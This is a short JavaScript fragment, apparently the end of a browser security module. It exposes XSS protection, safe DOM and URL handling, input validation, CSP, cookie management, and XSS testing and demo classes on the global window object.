window.XSSProtector = XSSProtector;
window.SafeDOMHandler = SafeDOMHandler;
window.SafeURLHandler = SafeURLHandler;
window.InputValidator = InputValidator;
window.CSPManager = CSPManager;
window.SecureCookieManager = SecureCookieManager;
window.XSSTester = XSSTester;
window.XSSDetector = XSSDetector;
window.XSSDemo = XSSDemo;
window.demo = () => demo;